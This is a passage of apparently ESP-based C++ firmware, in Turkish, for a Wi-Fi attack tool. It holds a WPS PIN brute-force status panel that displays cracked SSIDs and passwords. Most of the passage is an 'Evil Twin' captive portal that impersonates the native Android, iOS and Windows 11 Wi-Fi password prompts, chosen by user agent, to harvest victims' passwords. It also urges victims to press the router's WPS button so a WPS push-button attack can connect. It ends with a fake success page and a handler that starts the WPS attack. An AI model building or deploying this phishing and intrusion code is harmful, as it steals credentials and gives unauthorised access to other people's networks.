        "h+='<div style=\"color:#f0883e;background:#2d1a00;border:1px solid #f0883e;"
              "border-radius:6px;padding:11px;margin-bottom:9px\">&#128260; Deneniyor: <b>'+d.pin+'</b>"
              " &mdash; '+d.attempt+'/'+d.total+'</div>';"
        "h+='<div style=\"background:#21262d;border-radius:4px;height:8px;margin-bottom:12px\">"
              "<div style=\"background:#1f6feb;height:8px;border-radius:4px;width:'+pct+'%\"></div></div>';"
        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Durdur</button></form>';"
      "} else if(d.state==='locked'){"
        "h+='<div style=\"color:#d29922;background:#2d1f0e;border:1px solid #d29922;"
              "border-radius:6px;padding:11px;margin-bottom:9px\">&#9203; AP Rate-Limit / Lockout! Bekleniyor... ('+"
        "d.attempt+'/'+d.total+' denendi)</div>';"
        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Durdur</button></form>';"
      "} else if(d.state==='success'){"
        "h+='<div class=\"alert-ok\">&#9989; PIN Bulundu! <b>'+d.found_pin+'</b><br>"
              "SSID: <b>'+d.found_ssid+'</b><br>"
              "Sifre: <span class=\"pw-pass\">'+d.found_pass+'</span></div>';"
        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Temizle</button></form>';"
        "_wL=0;"
      "} else if(d.state==='exhausted'){"
        "h+='<div class=\"alert-err\">&#10060; Tum PIN&#39;ler denendi, basarili olamadi.</div>';"
        "h+='<form method=\"post\" action=\"/wps_scan\"><button class=\"btn btn-gray\" type=\"submit\">&#128260; Yeniden Tara</button></form>';"
        "_wL=0;"
      "} else { _wL=0; }"
      "var el=document.getElementById('wps-status');"
      "if(el&&d.state!=='idle'&&d.state!=='stopped')el.innerHTML=h;"
    "}"
    "function wpsPoll(){"
      "if(!_wL)return;"
      "fetch('/wps_status')"
        ".then(function(r){return r.json();})"
        ".then(function(d){"
          "_wL=(d.state==='attacking'||d.state==='locked')?1:0;"
          "wpsB(d);"
          "setTimeout(wpsPoll,1500);"
        "})"
        ".catch(function(){if(_wL)setTimeout(wpsPoll,3000);});"
    "}"
    "if(_wL)setTimeout(wpsPoll,1500);"
  );
  html += F("</script>");
  html += F("</body></html>");

  server.send(200, "text/html", html);
}

// ─── WPS PBC Başarı Sayfası ───────────────────────────────────────────────────
static void portal_wps_success_page() {
  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
  server.send(200, "text/html", "");
  server.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Ba&#287;land&#305;</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;"
      "background:#f0f2f5;color:#1a1a2e;min-height:100vh}"
    ".hdr{background:linear-gradient(90deg,#c0392b,#e74c3c);"
      "padding:14px 20px;display:flex;align-items:center;gap:12px;color:#fff}"
    ".hdr-ico{width:38px;height:38px;background:rgba(255,255,255,.2);"
      "border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px}"
    ".hdr-title{font-size:1em;font-weight:700}"
    ".wrap{max-width:400px;margin:32px auto;padding:0 16px}"
    ".card-ok{background:#fff;border-radius:16px;padding:36px 24px;text-align:center;"
      "box-shadow:0 2px 12px rgba(0,0,0,.10);border-top:5px solid #27ae60}"
    ".big-ico{font-size:64px;display:block;margin-bottom:16px}"
    "h1{color:#1e7e34;font-size:1.3em;margin-bottom:10px;font-weight:800}"
    "p{font-size:.9em;color:#555;line-height:1.65}"
    ".steps-ok{list-style:none;margin:20px 0 0;text-align:left}"
    ".steps-ok li{display:flex;align-items:center;gap:10px;padding:7px 0;"
      "border-bottom:1px solid #f0f2f5;font-size:.85em;color:#444}"
    ".steps-ok li:last-child{border-bottom:none}"
    ".ok-ico{color:#27ae60;font-size:18px;flex-shrink:0}"
    "</style></head><body>"
    "<div class='hdr'>"
      "<div class='hdr-ico'>&#128225;</div>"
      "<div><div class='hdr-title'>Ba&#287;lant&#305; Hizmetleri</div></div>"
    "</div>"
    "<div class='wrap'>"
      "<div class='card-ok'>"
        "<span class='big-ico'>&#9989;</span>"
        "<h1>Ba&#287;lant&#305;n&#305;z Yenilendi!</h1>"
        "<p>&#304;nternet ba&#287;lant&#305;n&#305;z ba&#351;ar&#305;yla do&#287;ruland&#305;."
           " Birka&#231; saniye i&#231;inde otomatik olarak ba&#287;lanacaks&#305;n&#305;z.</p>"
        "<ul class='steps-ok'>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>A&#287; g&#252;venli&#287;i do&#287;ruland&#305;</span></li>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>Ba&#287;lant&#305; yenilendi</span></li>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>&#304;nternet eri&#351;imi aktif</span></li>"
        "</ul>"
      "</div>"
    "</div>"
    "</body></html>"));
}

// ─── Captive Portal (Evil Twin istemciler için) ───────────────────────────────
// UA tespiti: iPhone/iPad → iOS tasarımı, diğer → Android MD3 tasarımı
// Renk teması: prefers-color-scheme ile cihazdan otomatik alınır


static void portal_android(bool wrong_pass, const String &ssid) {
  // Material Design 3 — tam ekran görüntüsü eşleşmesi (koyu/açık otomatik)
  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
  server.send(200, "text/html", "");
  server.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
    "<title>"));
  server.sendContent(ssid);
  server.sendContent(F("</title><style>"
    ":root{"
      "--bg:#1C1B1F;--surf:#2B2930;--surf2:#38343C;"
      "--on-bg:#E6E1E5;--on-surf:#E6E1E5;"
      "--outline:#938F99;--outline-var:rgba(147,143,153,.35);"
      "--primary:#D0BCFF;--on-pri:#381E72;"
      "--hint:#938F99;--err:#F2B8B8;--err-bg:rgba(242,184,184,.12)"
    "}"
    "@media(prefers-color-scheme:light){"
      ":root{"
        "--bg:#FFFBFE;--surf:#F4EFF4;--surf2:#ECE6F0;"
        "--on-bg:#1C1B1F;--on-surf:#1C1B1F;"
        "--outline:#79747E;--outline-var:rgba(121,116,126,.3);"
        "--primary:#6750A4;--on-pri:#FFFFFF;"
        "--hint:#49454F;--err:#B3261E;--err-bg:rgba(179,38,30,.08)"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:'Google Sans',Roboto,'Noto Sans',sans-serif;"
      "background:var(--bg);color:var(--on-bg);min-height:100vh;padding:0 20px 32px}"
    ".back-row{padding:12px 0 0;margin-bottom:20px}"
    ".back{width:40px;height:40px;display:flex;align-items:center;justify-content:center;"
      "border-radius:50%;border:none;background:var(--surf2);color:var(--on-bg);"
      "cursor:pointer;padding:0}"
    "h1{font-size:28px;font-weight:400;color:var(--on-bg);margin-bottom:32px;"
      "line-height:1.2;word-break:break-all;letter-spacing:-.3px}"
    /* Underline text field — exact MD3 filled style */
    ".field{position:relative;margin-bottom:4px}"
    ".finput{"
      "width:100%;height:56px;"
      "background:var(--surf);"
      "border:none;border-bottom:1px solid var(--outline);"
      "border-radius:4px 4px 0 0;"
      "padding:20px 48px 6px 16px;"
      "font-size:16px;color:var(--on-bg);"
      "outline:none;-webkit-appearance:none;appearance:none;"
      "font-family:inherit"
    "}"
    ".finput:focus{border-bottom:2px solid var(--primary)}"
    ".flabel{"
      "position:absolute;left:16px;top:50%;transform:translateY(-50%);"
      "font-size:16px;color:var(--hint);pointer-events:none;"
      "transition:all .15s ease"
    "}"
    ".finput:focus~.flabel,"
    ".finput:not(:placeholder-shown)~.flabel{"
      "top:14px;transform:none;font-size:12px;color:var(--primary)"
    "}"
    ".finput:not(:focus)~.flabel{color:var(--outline)}"
    ".eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--outline);"
      "padding:6px;line-height:0}"
    ".hint-txt{font-size:12px;color:var(--hint);margin:4px 0 28px 16px}"
    ".err-txt{font-size:12px;color:var(--err);margin:4px 0 28px 16px;"
      "background:var(--err-bg);padding:8px 12px;border-radius:4px}"
    /* WPS hint */
    ".wps-hint{background:var(--surf);border-radius:12px;margin-top:20px;"
      "padding:14px 16px;display:flex;gap:10px;align-items:flex-start}"
    ".wps-badge{background:#1565C0;color:#fff;font-size:10px;font-weight:700;"
      "padding:3px 7px;border-radius:4px;flex-shrink:0;margin-top:1px;letter-spacing:.3px}"
    ".wps-txt{font-size:13px;color:var(--hint);line-height:1.5}"
    /* Buttons */
    ".btns{display:flex;justify-content:flex-end;gap:10px}"
    ".bcancel{"
      "height:40px;padding:0 24px;border-radius:20px;"
      "border:1px solid var(--outline);background:transparent;"
      "color:var(--on-bg);font-size:14px;font-family:inherit;cursor:pointer"
    "}"
    ".bconnect{"
      "height:40px;padding:0 24px;border-radius:20px;"
      "border:none;background:var(--primary);color:var(--on-pri);"
      "font-size:14px;font-family:inherit;font-weight:500;cursor:pointer"
    "}"
    "</style></head><body>"
    "<div class='back-row'>"
    "<button class='back' onclick='history.back()'>"
      "<svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>"
        "<path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/>"
      "</svg>"
    "</button></div>"
    "<h1>"));
  server.sendContent(ssid);
  server.sendContent(F("</h1>"
    "<p style='font-size:13px;color:var(--hint);text-align:center;margin:0 0 14px'>"
      "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
    "</p>"
    "<form method='post' action='/submit' id='f'>"
    "<div class='field'>"
      "<input class='finput' type='password' name='password' id='pw'"
        " placeholder=' ' autocomplete='off'>"
      "<label class='flabel' for='pw'>&#350;ifre*</label>"
      "<button type='button' class='eye' onclick='togglePw()'>"
        "<svg width='22' height='22' viewBox='0 0 24 24' fill='currentColor'>"
          "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5"
          "s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5"
          "s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3"
          " 3-1.34 3-3-1.34-3-3-3z'/>"
        "</svg>"
      "</button>"
    "</div>"));
  if (wrong_pass) {
    server.sendContent(F("<div class='err-txt'>Yanl&#305;&#351; &#351;ifre, l&#252;tfen tekrar deneyin.</div>"));
  } else {
    server.sendContent(F("<p class='hint-txt'>*zorunlu</p>"));
  }
  server.sendContent(F(
  "<div class='btns'>"
    "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
    "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
  "</div>"
  "</form>"
  "<div class='wps-hint'>"
    "<span class='wps-badge'>WPS</span>"
    "<div style='flex:1'>"
      "<div style='font-size:13px;font-weight:600;margin-bottom:4px;color:var(--on-bg)'>"
        "&#350;ifresiz ba&#287;lan"
      "</div>"
      "<div class='wps-txt'>"
        "<b>&#350;ifreyi bilmiyorsan&#305;z</b> modemin arkas&#305;ndaki "
        "<b>WPS</b> tu&#351;una <b>3&ndash;5 saniye</b> basarak "
        "&#351;ifresiz ba&#287;lanabilirsiniz. Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
      "</div>"
    "</div>"
  "</div>"
  "<script>"
    "function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}"
    "setInterval(function(){"
      "var x=new XMLHttpRequest();"
      "x.open('GET','/et_wps_pbc_status',true);"
      "x.onreadystatechange=function(){"
        "if(x.readyState===4&&x.status===200){"
          "try{var d=JSON.parse(x.responseText);if(d.f){location.href='/portal';}}catch(e){}"
        "}"
      "};"
      "x.send();"
    "},1500);"
  "</script>"
  "</body></html>"));
}

static void portal_ios(bool wrong_pass, const String &ssid) {
  // Apple iOS — tam native WiFi parola ekranı (koyu/açık otomatik)
  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
  server.send(200, "text/html", "");
  server.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
    "<title>Parolay&#305; Gir</title><style>"
    ":root{"
      "--bg:#F2F2F7;--cell:#FFFFFF;--text:#000000;--text2:rgba(60,60,67,.6);"
      "--sep:rgba(60,60,67,.29);--tint:#007AFF;--ph:rgba(60,60,67,.3);"
      "--err:#FF3B30;--nav-bg:rgba(242,242,247,.85)"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#000000;--cell:#1C1C1E;--text:#FFFFFF;--text2:rgba(235,235,245,.6);"
        "--sep:rgba(84,84,88,.65);--tint:#0A84FF;--ph:rgba(235,235,245,.3);"
        "--err:#FF453A;--nav-bg:rgba(28,28,30,.85)"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:-apple-system,'SF Pro Text','Helvetica Neue',sans-serif;"
      "background:var(--bg);color:var(--text);min-height:100vh}"
    /* Nav bar */
    ".nav{display:flex;align-items:center;justify-content:space-between;"
      "padding:14px 16px 10px;backdrop-filter:blur(20px);"
      "-webkit-backdrop-filter:blur(20px);background:var(--nav-bg);"
      "border-bottom:.5px solid var(--sep)}"
    ".nav-cancel{color:var(--tint);font-size:17px;border:none;background:none;"
      "cursor:pointer;padding:4px 0;font-family:inherit;letter-spacing:-.2px}"
    ".nav-title{font-size:17px;font-weight:600;letter-spacing:-.4px}"
    ".nav-join{color:var(--tint);font-size:17px;font-weight:600;border:none;"
      "background:none;cursor:pointer;padding:4px 0;font-family:inherit}"
    ".nav-join:disabled{opacity:.35}"
    /* Content */
    ".content{padding:28px 16px 0}"
    ".wifi-ico{font-size:58px;text-align:center;margin-bottom:14px;line-height:1}"
    ".ssid-lbl{font-size:22px;font-weight:600;text-align:center;margin-bottom:8px;"
      "word-break:break-all;letter-spacing:-.5px}"
    ".sub{font-size:13px;color:var(--text2);text-align:center;margin-bottom:24px;"
      "line-height:1.55;padding:0 8px}"
    /* Error */
    ".err-box{background:var(--cell);border-radius:10px;padding:12px 16px;"
      "margin-bottom:14px;font-size:13px;color:var(--err);text-align:left;"
      "display:flex;gap:8px;align-items:flex-start}"
    /* Input cell */
    ".cell-group{background:var(--cell);border-radius:12px;overflow:hidden;margin-bottom:8px}"
    ".cell{display:flex;align-items:center;min-height:44px;padding:0 16px}"
    ".cell+.cell{border-top:.5px solid var(--sep)}"
    ".cell-lbl{font-size:17px;min-width:90px;flex-shrink:0;letter-spacing:-.2px}"
    ".cell-input{flex:1;border:none;background:transparent;font-size:17px;"
      "color:var(--text);outline:none;padding:10px 8px;-webkit-appearance:none;"
      "font-family:inherit;letter-spacing:-.2px}"
    ".cell-input::placeholder{color:var(--ph)}"
    ".eye-ios{background:none;border:none;color:var(--text2);cursor:pointer;"
      "padding:4px 0 4px 10px;display:flex;align-items:center}"
    /* WPS hint */
    ".wps-hint{background:var(--cell);border-radius:12px;padding:14px 16px;"
      "margin-top:16px;display:flex;gap:10px;align-items:flex-start}"
    ".wps-badge{background:#1565C0;color:#fff;font-size:10px;font-weight:700;"
      "padding:3px 7px;border-radius:4px;flex-shrink:0;margin-top:1px;letter-spacing:.3px}"
    ".wps-txt{font-size:13px;color:var(--text2);line-height:1.5}"
    ".wps-bnr{display:none;margin-top:10px;background:#DBEEFF;border-radius:8px;"
      "padding:9px 12px;font-size:12px;color:#1565C0;font-weight:600;text-align:center}"
    "@media(prefers-color-scheme:dark){.wps-hint{border:.5px solid var(--sep)}"
      ".wps-bnr{background:#0D2A4A;color:#58A6FF}}"
    "</style></head><body>"
    "<div class='nav'>"
      "<button class='nav-cancel' onclick='history.back()'>&#304;ptal</button>"
      "<span class='nav-title'>Parolay&#305; Gir</span>"
      "<button class='nav-join' form='f' type='submit' id='joinbtn' disabled>Kat&#305;l</button>"
    "</div>"
    "<div class='content'>"
      "<div class='wifi-ico'>&#128225;</div>"
      "<div class='ssid-lbl'>"));
  server.sendContent(ssid);
  server.sendContent(F("</div>"
      "<div class='sub'>"
        "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
        "<br><span style='font-size:11px;opacity:.7'>"
          "&ldquo;Wi-Fi Key&rdquo; &bull; &ldquo;WPA Key&rdquo; &bull; &ldquo;Password&rdquo;"
        "</span>"
      "</div>"));
  if (wrong_pass) {
    server.sendContent(F("<div class='err-box'>"
      "<span>&#9888;&#65039;</span>"
      "<span>Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</span>"
    "</div>"));
  }
  server.sendContent(F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0;padding:0 16px'>"
      "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
    "</p>"
    "<form id='f' method='post' action='/submit'>"
      "<div class='cell-group'>"
        "<div class='cell'>"
          "<span class='cell-lbl'>Parola</span>"
          "<input class='cell-input' type='password' name='password' id='pw'"
            " placeholder='Gerekli' autocomplete='off'"
            " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<1'>"
          "<button type='button' class='eye-ios' onclick='togglePw()'>"
            "<svg width='22' height='16' viewBox='0 0 24 18' fill='currentColor'>"
              "<path d='M12 3C7 3 2.73 6.11 1 10c1.73 3.89 6 7 11 7s9.27-3.11 11-7"
              "c-1.73-3.89-6-7-11-7zm0 11.5c-2.49 0-4.5-2.01-4.5-4.5S9.51 5.5 12 5.5"
              "s4.5 2.01 4.5 4.5-2.01 4.5-4.5 4.5zm0-7.2c-1.49 0-2.7 1.21-2.7 2.7"
              "s1.21 2.7 2.7 2.7 2.7-1.21 2.7-2.7-1.21-2.7-2.7-2.7z'/>"
            "</svg>"
          "</button>"
        "</div>"
      "</div>"
    "</form>"
    "<div class='wps-hint'>"
      "<span class='wps-badge'>WPS</span>"
      "<div style='flex:1'>"
        "<div style='font-size:13px;font-weight:600;margin-bottom:4px'>&#350;ifresiz ba&#287;lan</div>"
        "<div class='wps-txt' style='margin-bottom:7px'>"
          "<b>&#350;ifreyi bilmiyorsan&#305;z</b> modemin arkas&#305;ndaki "
          "<b>WPS</b> tu&#351;una <b>3&ndash;5 saniye</b> basarak "
          "&#351;ifresiz ba&#287;lanabilirsiniz. Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
        "</div>"
      "</div>"
    "</div>"
  "</div>"
  "<script>"
    "function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}"
    "setInterval(function(){"
      "var x=new XMLHttpRequest();"
      "x.open('GET','/et_wps_pbc_status',true);"
      "x.onreadystatechange=function(){"
        "if(x.readyState===4&&x.status===200){"
          "try{var d=JSON.parse(x.responseText);if(d.f){location.href='/portal';}}catch(e){}"
        "}"
      "};"
      "x.send();"
    "},1500);"
  "</script>"
  "</body></html>"));
}

static void portal_desktop(bool wrong_pass, const String &ssid) {
  // Windows 11 WiFi flyout — masaüstü tarayıcılar için (koyu/açık otomatik)
  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
  server.send(200, "text/html", "");
  server.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Ba&#287;lan: "));
  server.sendContent(ssid);
  server.sendContent(F("</title><style>"
    ":root{"
      "--bg:#F3F3F3;--card:#FFFFFF;--text:#1A1A1A;--text2:#5D5D5D;"
      "--border:#E0E0E0;--sep:#EBEBEB;"
      "--input-bg:#FAFAFA;--input-border:#ABABAB;"
      "--accent:#0078D4;--accent-h:#006CBE;--accent-txt:#FFFFFF;"
      "--cancel-bg:#F0F0F0;--cancel-h:#E8E8E8;--cancel-txt:#1A1A1A;--cancel-bd:#D0D0D0;"
      "--shadow:0 8px 32px rgba(0,0,0,.14),0 2px 8px rgba(0,0,0,.08);"
      "--err:#C42B1C;--err-bg:#FDE7E9;--err-bd:#F1BCBC;"
      "--wps-bg:#EBF4FF;--wps-bd:#B3D4F5;--wps-txt:#0063B1"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#1A1A1A;--card:#2C2C2C;--text:#FFFFFF;--text2:#ABABAB;"
        "--border:#3C3C3C;--sep:#404040;"
        "--input-bg:#383838;--input-border:#5A5A5A;"
        "--accent:#60CDFF;--accent-h:#4FC3F7;--accent-txt:#1A1A1A;"
        "--cancel-bg:#383838;--cancel-h:#424242;--cancel-txt:#FFFFFF;--cancel-bd:#505050;"
        "--shadow:0 8px 32px rgba(0,0,0,.5),0 2px 8px rgba(0,0,0,.3);"
        "--err:#FF9494;--err-bg:#3D1A1A;--err-bd:#7A3030;"
        "--wps-bg:#0D2235;--wps-bd:#1F4A72;--wps-txt:#60CDFF"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Segoe UI Variable','Segoe UI Variable Text','Segoe UI',system-ui,sans-serif;"
      "background:var(--bg);min-height:100vh;"
      "display:flex;align-items:center;justify-content:center;padding:24px}"
    ".card{background:var(--card);border:1px solid var(--border);"
      "border-radius:8px;padding:0;width:100%;max-width:380px;"
      "box-shadow:var(--shadow)}"
    /* Header strip */
    ".hdr{padding:20px 24px 16px;border-bottom:1px solid var(--sep)}"
    ".hdr-top{display:flex;align-items:center;gap:12px;margin-bottom:4px}"
    ".wifi-ico{width:36px;height:36px;background:var(--accent);border-radius:50%;"
      "display:flex;align-items:center;justify-content:center;color:var(--accent-txt);font-size:18px;flex-shrink:0}"
    ".ssid-txt{font-size:14px;font-weight:600;word-break:break-all;line-height:1.3}"
    ".ssid-sub{font-size:12px;color:var(--text2);margin-top:3px}"
    /* Body */
    ".body{padding:18px 24px 20px}"
    ".info-txt{font-size:13px;color:var(--text2);margin-bottom:16px;line-height:1.5}"
    /* Error */
    ".err-box{background:var(--err-bg);border:1px solid var(--err-bd);border-radius:4px;"
      "padding:9px 12px;margin-bottom:14px;"
      "font-size:12px;color:var(--err);display:flex;gap:7px;align-items:center}"
    /* Input */
    ".field-lbl{font-size:12px;color:var(--text2);margin-bottom:5px;display:block;font-weight:400}"
    ".field-wrap{position:relative;margin-bottom:6px}"
    ".field-input{width:100%;height:30px;background:var(--input-bg);"
      "border:1px solid var(--input-border);border-radius:3px;"
      "padding:0 34px 0 10px;font-size:13px;color:var(--text);"
      "font-family:inherit;outline:none;transition:border-color .15s,box-shadow .15s}"
    ".field-input:focus{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}"
    ".eye-btn{position:absolute;right:6px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--text2);"
      "padding:0;line-height:0;display:flex;align-items:center}"
    ".hint-sm{font-size:11px;color:var(--text2);margin-bottom:14px;opacity:.8}"
    /* Checkbox */
    ".chk-row{display:flex;align-items:center;gap:8px;margin-bottom:20px}"
    ".chk-row input{width:13px;height:13px;accent-color:var(--accent);cursor:pointer;flex-shrink:0}"
    ".chk-row label{font-size:12px;color:var(--text2);cursor:pointer}"
    /* Buttons */
    ".btn-row{display:flex;justify-content:flex-end;gap:8px;padding-top:4px}"
    ".btn{height:30px;padding:0 16px;border-radius:3px;"
      "font-size:13px;font-family:inherit;cursor:pointer;font-weight:400}"
    ".btn-cancel{background:var(--cancel-bg);color:var(--cancel-txt);"
      "border:1px solid var(--cancel-bd)}"
    ".btn-cancel:hover{background:var(--cancel-h)}"
    ".btn-connect{background:var(--accent);color:var(--accent-txt);border:none;font-weight:600}"
    ".btn-connect:hover{background:var(--accent-h)}"
    /* WPS hint */
    ".wps-strip{background:var(--wps-bg);border:1px solid var(--wps-bd);"
      "border-radius:0 0 7px 7px;padding:11px 16px;"
      "display:flex;gap:9px;align-items:flex-start}"
    ".wps-badge{background:#0063B1;color:#fff;font-size:10px;font-weight:700;"
      "padding:2px 6px;border-radius:3px;flex-shrink:0;letter-spacing:.3px;margin-top:1px}"
    "@media(prefers-color-scheme:dark){.wps-badge{background:#60CDFF;color:#000}}"
    ".wps-info{font-size:12px;color:var(--wps-txt);line-height:1.5}"
    ".wps-bnr{display:none;margin-top:7px;background:rgba(0,120,212,.15);"
      "border-radius:3px;padding:7px 10px;"
      "font-size:11px;color:var(--wps-txt);font-weight:600;text-align:center}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='hdr'>"
      "<div class='hdr-top'>"
        "<div class='wifi-ico'>&#128225;</div>"
        "<div>"
          "<div class='ssid-txt'>"));
  server.sendContent(ssid);
  server.sendContent(F("</div>"
          "<div class='ssid-sub'>Kilitli &bull; Kablosuz A&#287; G&#252;venlik Anahtar&#305; Gerekli</div>"
        "</div>"
      "</div>"
    "</div>"
    "<div class='body'>"
      "<p class='info-txt'>"
        "Wi-Fi &#351;ifresi modemin/router&#305;n alt veya yan etiketinde yazar."
        " &ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
      "</p>"));
  if (wrong_pass) {
    server.sendContent(F("<div class='err-box'>"
        "<svg width='14' height='14' viewBox='0 0 24 24' fill='currentColor'>"
          "<path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/>"
        "</svg>"
        "<span>A&#287;&#305;n g&#252;venlik anahtar&#305; yanl&#305;&#351;. Tekrar deneyin.</span>"
      "</div>"));
  }
  server.sendContent(F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0'>"
      "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
    "</p>"
    "<form method='post' action='/submit'>"
      "<label class='field-lbl' for='pw'>A&#287; G&#252;venlik Anahtar&#305;</label>"
      "<div class='field-wrap'>"
        "<input class='field-input' type='password' name='password' id='pw'"
          " placeholder='Parolay&#305; girin' autocomplete='off'>"
        "<button type='button' class='eye-btn' onclick='togglePw()'>"
          "<svg width='16' height='16' viewBox='0 0 24 24' fill='currentColor'>"
            "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
            "c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"
            "m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/>"
          "</svg>"
        "</button>"
      "</div>"
      "<p class='hint-sm'>Parola en az 8 karakter olmal&#305;d&#305;r.</p>"
      "<div class='chk-row'>"
        "<input type='checkbox' id='auto' checked>"
        "<label for='auto'>Karakterleri gizle</label>"
      "</div>"
      "<div class='btn-row'>"
        "<button type='button' class='btn btn-cancel' onclick='history.back()'>&#304;ptal</button>"
        "<button type='submit' class='btn btn-connect'>&#304;leri</button>"
      "</div>"
    "</form>"
    "</div>"
    "<div class='wps-strip'>"
      "<span class='wps-badge'>WPS</span>"
      "<div style='flex:1'>"
        "<div class='wps-info'>"
          "<b>&#350;ifreyi bilmiyorsan&#305;z</b> modemin arkas&#305;ndaki "
          "<b>WPS tu&#351;una 3&ndash;5 saniye</b> basarak &#351;ifresiz ba&#287;lanabilirsiniz. "
          "Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
        "</div>"
      "</div>"
    "</div>"
  "</div>"
  "<script>"
    "function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}"
    "setInterval(function(){"
      "var x=new XMLHttpRequest();"
      "x.open('GET','/et_wps_pbc_status',true);"
      "x.onreadystatechange=function(){"
        "if(x.readyState===4&&x.status===200){"
          "try{var d=JSON.parse(x.responseText);if(d.f){location.href='/portal';}}catch(e){}"
        "}"
      "};"
      "x.send();"
    "},1500);"
  "</script>"
  "</body></html>"));
}

static void portal_page(bool wrong_pass) {
  String ua = server.header("User-Agent");

  // iOS tespiti
  bool is_ios = ua.indexOf("iPhone") >= 0 ||
                ua.indexOf("iPad")   >= 0 ||
                ua.indexOf("iPod")   >= 0;
  if (is_ios) { portal_ios(wrong_pass, evil_twin_ssid); return; }

  // Android tespiti (masaüstü UA'sında "Android" geçmez)
  bool is_android = ua.indexOf("Android") >= 0;
  if (is_android) { portal_android(wrong_pass, evil_twin_ssid); return; }

  // Windows, macOS, Linux, ChromeOS vb. masaüstü / diğer
  portal_desktop(wrong_pass, evil_twin_ssid);
}

static void handle_portal() {
  if (!evil_twin_active) { redirect_root(); return; }
  // WPS PBC başarılıysa başarı sayfasını göster
  if (et_wps_pbc_found) {
    portal_wps_success_page();
    return;
  }
  // Her durumda platform'a özel yeni tasarımı göster (Android/iOS/Windows).
  portal_page(false);
}

static void handle_portal_wrong() {
  if (!evil_twin_active) { redirect_root(); return; }
  portal_page(true);
}

// /portal_manual → şifre formunu doğrudan göster (WPS fallback)
static void handle_portal_manual() {
  if (!evil_twin_active) { redirect_root(); return; }
  portal_page(false);
}

// /et_wps_pbc_status → captive portal polling: WPS PBC durumu (running/found)
static void handle_et_wps_pbc_status() {
  String json = "{\"r\":";
  json += et_wps_pbc_running ? "1" : "0";
  json += ",\"f\":";
  json += et_wps_pbc_found   ? "1" : "0";
  json += "}";
  server.send(200, "application/json", json);
}

// /wps_pbc_start → WPS PBC saldırısını başlat (yönetim sayfasından)
static void handle_wps_pbc_start() {
